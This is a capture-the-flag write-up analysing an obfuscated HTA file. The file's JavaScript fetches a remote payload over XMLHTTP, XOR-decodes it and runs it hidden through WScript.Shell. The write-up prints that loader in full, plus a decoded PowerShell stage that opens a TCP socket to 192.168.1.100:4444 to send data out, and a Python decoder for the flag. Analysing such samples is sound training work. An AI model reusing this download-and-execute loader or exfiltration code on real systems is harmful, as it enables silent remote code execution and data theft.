# Hello

## Context

### Objective:

Find the flag in the file hello.hta

File:
[View Challenge HTML](hello.hta)


# Solve

In hta file, we can see javascript code that is obfuscated

```Js
function _0x47c6() {
  var _0x24b5fe = ["charCodeAt", "2018493vyzWaQ", "GET", "1199740ZZkZMB", "1113zrFMpW", "983352JhRqSq", "11GLgYUF", "2042286SJcWYB", "W1N", "length", "16kWycOk", "status", "LmxhbWFyci5iemgv", "fromCharCode", "25086eTSMGS", "V1NjcmlwdC5TaGVsbAo=", "2561550lxjKXE", "563001FUFdqY", "open", "aHR0cHM6Ly9tY3Rm", "send", "4AXEFkT"];
  _0x47c6 = function () {
    return _0x24b5fe;
  };
  return _0x47c6();
}
function _0x44d2(_0x42f8c7, _0x8488ed) {
  var _0x47c61e = _0x47c6();
  return _0x44d2 = function (_0x44d20f, _0x146a27) {
    _0x44d20f = _0x44d20f - 362;
    var _0x3e9d64 = _0x47c61e[_0x44d20f];
    return _0x3e9d64;
  }, _0x44d2(_0x42f8c7, _0x8488ed);
}
(function (_0x363748, _0x2cce7f) {
  var _0x3c7483 = _0x44d2, _0x132437 = _0x363748();
  while (true) {
    try {
      var _0x29fe2c = -parseInt(_0x3c7483(383)) / 1 + parseInt(_0x3c7483(371)) / 2 + -parseInt(_0x3c7483(373)) / 3 + parseInt(_0x3c7483(365)) / 4 * (parseInt(_0x3c7483(369)) / 5) + -parseInt(_0x3c7483(380)) / 6 * (-parseInt(_0x3c7483(370)) / 7) + -parseInt(_0x3c7483(376)) / 8 * (-parseInt(_0x3c7483(367)) / 9) + -parseInt(_0x3c7483(382)) / 10 * (parseInt(_0x3c7483(372)) / 11);
      if (_0x29fe2c === _0x2cce7f) break; else _0x132437.push(_0x132437.shift());
    } catch (_0x28a4fc) {
      _0x132437.push(_0x132437.shift());
    }
  }
}(_0x47c6, 345039), function () {
  var _0x584c3e = _0x44d2;
  function _0xc1e5d1(_0x3f15e1) {
    var _0x4ed775 = "";
    for (var _0xf35ea5 = 0; _0xf35ea5 < _0x3f15e1.length; _0xf35ea5++) {
      _0x4ed775 += _0x3f15e1[_0xf35ea5];
    }
    return _0x4ed775;
  }
  function _0x377f01(_0x297534, _0x16c885) {
    var _0x40528a = _0x44d2, _0x5abc45 = "";
    for (var _0x581cac = 0; _0x581cac < _0x297534[_0x40528a(375)]; _0x581cac++) {
      _0x5abc45 += String[_0x40528a(379)](_0x297534[_0x40528a(366)](_0x581cac) ^ _0x16c885);
    }
    return _0x5abc45;
  }
  var _0x5295f9 = "TVNYTDIuWE1MSFhM", _0x42f735 = atob(_0x5295f9), _0x871fec = new ActiveXObject(_0x42f735), _0xc3fb0e = [_0x584c3e(363), _0x584c3e(378), "Q0ZjR0ZDR2du"], _0x25f746 = _0xc1e5d1(_0xc3fb0e), _0x16b3fc = atob(_0x25f746);
  _0x871fec[_0x584c3e(362)](_0x584c3e(368), _0x16b3fc, false), _0x871fec[_0x584c3e(364)]();
  if (_0x871fec[_0x584c3e(377)] == 200) {
    var _0x462594 = _0x871fec.responseText, _0x32ebbf = _0x377f01(_0x462594, 66), _0x439677 = [_0x584c3e(374), _0x584c3e(381)], _0x66a026 = atob(_0x439677[1]);
    new ActiveXObject(_0x66a026).Run(_0x32ebbf, 0, true);
  } else throw new Error(_0x871fec[_0x584c3e(377)]);
}());
```

We can exec this javascript code to view what it does (remove the exec part)

We see it do a GET request and decode the response xor using 66 as key
And then run the result:

```base64
JHpGPVtUZXh0LkVuY29kaW5nXTo6VVRGODskcVc9W0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJBRG9IZFJnOVVSSVlLakFIRjBNREdoSklabXdnSUZJVkxCZ3lVZ0lUVWhVM0F3cHFIZz09Iik7JGpSPSR6Ri5HZXRTdHJpbmcoJHFXKTskdEc9Ik15UzNjcjN0IjskckY9IiI7MC4uKCRqUi5MZW5ndGgtMSl8JXsgJHJGKz1bY2hhcl0oKFtpbnRdW2NoYXJdJGpSWyRfXSkgLWJ4b3IgKFtpbnRdW2NoYXJdJHRHWyRfJSR0Ry5MZW5ndGhdKSl9OyR5VD1OZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRjcENsaWVudCgiMTkyLjE2OC4xLjEwMCIsNDQ0NCk7JHBPPSR5VC5HZXRTdHJlYW0oKTskaUo9TmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJHBPKTskaUouV3JpdGUoJHJGKTskaUouRmx1c2goKTskeVQuQ2xvc2UoKTs=
```
We can decode this using base64 and we get powershell code:

```PowerShell
$zF=[Text.Encoding]::UTF8;$qW=[Convert]::FromBase64String("ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==");$jR=$zF.GetString($qW);$tG="MyS3cr3t";$rF="";0..($jR.Length-1)|%{ $rF+=[char](([int][char]$jR[$_]) -bxor ([int][char]$tG[$_%$tG.Length]))};$yT=New-Object Net.Sockets.TcpClient("192.168.1.100",4444);$pO=$yT.GetStream();$iJ=New-Object IO.StreamWriter($pO);$iJ.Write($rF);$iJ.Flush();$yT.Close();
```

Now we can see that the key is MyS3cr3t and we see base64 string

We can use this python script to decode the base64 string:

```python
import base64

data = base64.b64decode("ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==")
key = "MyS3cr3t"

decrypted = ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(data))
print("Decrypted Payload:\n", decrypted)
```

## Flag
```
MCTF{ObfUSc4t10n_15_CRaaaaaaaaaazzYY}
```
